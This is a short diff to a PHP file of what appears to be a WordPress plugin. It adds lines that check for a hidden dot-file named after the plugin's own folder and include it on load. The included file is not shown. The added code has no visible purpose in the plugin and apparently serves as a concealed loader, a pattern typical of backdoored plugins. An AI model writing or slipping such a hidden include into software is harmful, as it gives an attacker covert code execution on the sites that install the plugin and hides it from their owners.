@@ -14,6 +14,10 @@ if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');
 
 include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpdt_rest_api_available() {
   global $wp_version;
   return (
